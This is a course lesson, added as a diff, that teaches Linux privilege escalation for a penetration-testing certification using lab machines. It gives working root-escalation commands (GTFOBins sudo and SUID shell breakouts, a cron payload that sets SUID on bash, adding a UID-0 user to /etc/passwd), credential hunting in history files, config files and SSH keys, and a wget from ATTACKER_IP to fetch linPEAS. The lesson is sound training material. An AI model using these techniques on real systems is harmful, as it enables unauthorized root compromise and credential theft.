@@ -1,0 +1,152 @@
+# Network Module — Lesson 3: Linux Privilege Escalation
+
+**Methodology phase:** Post-exploitation — you have a user shell, you need root.
+**Why it matters for PT1:** each Network box has a **user flag and a root flag** (~36 pts each). The root flag lives behind privilege escalation. Reviewers named **GTFOBins** as core; this lesson turns a low-priv shell into root through the handful of vectors that appear again and again.
+
+**The mindset:** privesc is enumeration, not magic. You run enumeration, read the output for one misconfiguration, and abuse it. The tools find the vector; you supply the technique.
+
+---
+
+## 1. Automated enumeration first
+
+Before manual hunting, run an enumeration script. It surfaces 90% of vectors in seconds.
+
+```bash
+# get linpeas onto the target, make it runnable, then run it:
+chmod +x linpeas.sh
+./linpeas.sh | tee linpeas.txt
+```
+- **linPEAS** checks everything — SUID binaries, sudo rights, cron jobs, writable files, kernel version, credentials in files — and colour-codes findings by likelihood (red/yellow = look here first).
+- `tee linpeas.txt` — save the output so you can grep it and cite it in the report.
+- **Getting it onto the target** (the "serve on Kali, fetch on target" pattern from `labs/02`): download linPEAS from its GitHub releases to your Kali box, run `python3 -m http.server 80` in that folder, then on the target `wget http://ATTACKER_IP/linpeas.sh`. (`ATTACKER_IP` = your `tun0` address.)
+- **`chmod +x` is not optional** — a freshly downloaded script isn't executable, and `./linpeas.sh` will say *"Permission denied"* without it.
+
+Read the red/yellow hits, then confirm them manually with the sections below. **Don't blindly trust the script** — verify the vector exists before building on it.
+
+---
+
+## 2. The high-value vectors (in the order you check them)
+
+### 2.1 sudo rights — `sudo -l`
+```bash
+sudo -l
+```
+Lists what you can run as another user (often root), sometimes without a password. If you can run *anything* as root, check **GTFOBins**.
+
+**GTFOBins** (`gtfobins.github.io`) is the single most important privesc reference. It lists, for hundreds of binaries, how to abuse them to break out to a shell. Example — if `sudo -l` shows you can run `find` as root:
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+- `find`'s `-exec` runs a command; since `find` runs as root, so does your `/bin/sh`. Instant root.
+
+The pattern generalises: `vim`, `less`, `nano`, `awk`, `python`, `tar`, `nmap` — all have GTFOBins root breakouts when runnable via sudo. **Look up the exact binary on GTFOBins; don't memorise.**
+
+### 2.2 SUID binaries
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+- `-perm -4000` — the **SUID bit**: the binary runs with its *owner's* privileges (often root), regardless of who launches it.
+- `2>/dev/null` — discard the permission-denied noise so the real results are readable.
+
+Compare the list against a "normal" baseline. An unusual SUID binary (a custom program, or `find`/`cp`/`bash`/`nmap` with the bit set) is your vector — again, GTFOBins has the SUID abuse for each.
+
+### 2.3 Cron jobs
+```bash
+cat /etc/crontab
+ls -la /etc/cron.*
+```
+Look for scripts that run **as root on a schedule** and are **writable by you**, or that call a script/binary in a writable path. Write your payload into that file and wait for cron to run it as root:
+```bash
+echo 'chmod +s /bin/bash' >> /path/to/writable_cron_script.sh
+# after it runs: /bin/bash -p  (the -p keeps the SUID root privileges)
+```
+
+### 2.4 Writable files that matter
+- **`/etc/passwd` writable?** Add a root user with a known password hash:
+```bash
+openssl passwd -1 -salt xyz pass123          # generate the hash
+echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
+su hacker                                     # UID 0 = root
+```
+- **A writable script run by root**, a writable `PATH` entry, a writable service file — all the same idea: *you control something that root executes.*
+
+### 2.5 Kernel exploits (last resort)
+```bash
+uname -a          # kernel version
+```
+An old kernel (e.g. DirtyCow, PwnKit/CVE-2021-4034) can be exploited directly. Try this **last** — kernel exploits can crash the box, and on a shared exam environment that's costly. Prefer a config-based vector first.
+
+---
+
+## 3. Manual credential hunting
+
+Creds are everywhere on these boxes:
+```bash
+grep -rin 'password\|passwd\|secret\|api_key' /home /var/www /etc 2>/dev/null
+cat ~/.bash_history                  # commands with passwords typed inline
+cat /var/www/html/config.php         # web app DB creds
+ls -la ~/.ssh/                       # private keys to reuse
+```
+- `-r` recursive · `-i` case-insensitive · `-n` line numbers. A found password often unlocks root via `su` or sudo, or another box (credential reuse).
+
+---
+
+## 4. Worked example — sudo GTFOBins to root
+
+Room: **[TryHackMe — Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)**.
+
+1. **Land a user shell** (from Lesson 2) and stabilise it.
+2. **Run linpeas**, or start manual: `sudo -l` shows:
+   ```
+   User www-data may run the following commands:
+       (root) NOPASSWD: /usr/bin/awk
+   ```
+3. **GTFOBins `awk`** (sudo section):
+   ```bash
+   sudo awk 'BEGIN {system("/bin/sh")}'
+   ```
+   `awk` runs `system("/bin/sh")` as root because sudo grants it root, and `NOPASSWD` means no prompt. You're root.
+4. **Grab the root flag:** `cat /root/root.txt`.
+
+> **Dead end kept in:** I saw `awk` in `sudo -l` and tried to run it "normally" as root, which did nothing useful. The trick is GTFOBins' *specific* invocation — `BEGIN {system(...)}` — that turns a text tool into a shell. Lesson: the vector is the binary; the *technique* is on GTFOBins. Always look it up.
+
+---
+
+## 5. Exercises
+
+**Exercise 1 — sudo abuse.** Find a sudo-runnable binary and use its GTFOBins entry to get root. Which binary, which invocation?
+**Exercise 2 — SUID.** Enumerate SUID binaries, identify a non-standard one, and exploit it.
+**Exercise 3 — cron.** Find a root cron job with a writable component and use it to escalate. How long until it fired?
+**Exercise 4 — report it.** Write the privilege-escalation finding for one box, including the enumeration that found the vector and the remediation.
+
+---
+
+<details>
+<summary><b>Solutions & debrief</b></summary>
+
+**Exercise 1.** `sudo -l` → pick the binary → GTFOBins "Sudo" section → run its payload. e.g. `sudo vim -c ':!/bin/sh'`, `sudo less /etc/profile` then `!/bin/sh`, `sudo find . -exec /bin/sh \;`. Root shell, then `id` shows `uid=0`.
+
+**Exercise 2.** `find / -perm -4000 -type f 2>/dev/null` → spot the odd one out → GTFOBins "SUID" section. e.g. a SUID `bash` → `/bin/bash -p`; SUID `nmap` (old) → interactive mode `!sh`. Evidence = the find output + the root shell.
+
+**Exercise 3.** `cat /etc/crontab` shows a job like `* * * * * root /opt/backup.sh` where `backup.sh` is world-writable. Append `chmod +s /bin/bash` (or a reverse shell), wait for the interval (often 1 min), then `/bin/bash -p`. The interval is in the crontab's timing field.
+
+**Exercise 4 — model finding.**
+> **Title:** Local privilege escalation via misconfigured sudo (High).
+> **Category (predefined):** Privilege Escalation / Security Misconfiguration.
+> **Affected:** 10.10.x.x, user `www-data`.
+> **Initial reconnaissance:** `sudo -l` revealed `(root) NOPASSWD: /usr/bin/awk`; corroborated by linPEAS.
+> **Exploitation:** `sudo awk 'BEGIN {system("/bin/sh")}'` spawned a root shell (root flag `THM{...}`).
+> **Impact:** Any local user with this sudo entry gains full root — complete host compromise.
+> **Remediation:** Remove unnecessary sudo grants; never allow `NOPASSWD` on interpreters/text tools that can spawn shells (awk, vim, find, less). Apply least privilege in `/etc/sudoers`.
+
+</details>
+
+---
+
+## 6. Carry forward
+
+- Privesc is enumeration: linPEAS/manual → find one misconfiguration → abuse it. `sudo -l`, SUID, cron, writable files, then kernel as last resort.
+- **GTFOBins is your bible** for turning a permitted binary into a root shell. Bookmark it; look up the exact invocation every time.
+- Creds hide in `config.php`, `.bash_history`, `.ssh/`, and readable files — grep before you exploit.
+
+**Next lesson:** `network/04-windows-privilege-escalation.md` — the same discipline on Windows, where the tools and vectors differ.
